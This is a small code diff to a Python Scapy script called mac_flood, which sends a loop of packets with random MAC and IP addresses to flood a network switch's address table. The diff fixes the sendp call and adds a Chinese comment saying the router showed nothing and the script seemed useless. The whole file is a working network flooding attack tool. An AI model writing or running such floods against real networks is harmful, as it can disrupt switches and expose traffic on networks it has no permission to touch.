@@ -3,6 +3,7 @@
 RandMAC()随机产生mac
 RandIP随机产生ip 
 都可以接收模板，产生指定要求的mac或ip
+结果：路由器上啥也看不出来，好像没啥用
 """
 import argparse
 import sys
@@ -19,7 +20,7 @@ def mac_flood():
 		pkt = Ether(src=RandMAC(),dst=RandMAC()) / IP(
 			src=RandIP(),dst=RandIP()) / ICMP()
 		time.sleep(0.1)
-		sendp(packet=pkt,iface=iface,loop=0)
+		sendp(pkt,iface=iface,loop=0)
 
 if __name__ == '__main__':
 	mac_flood()
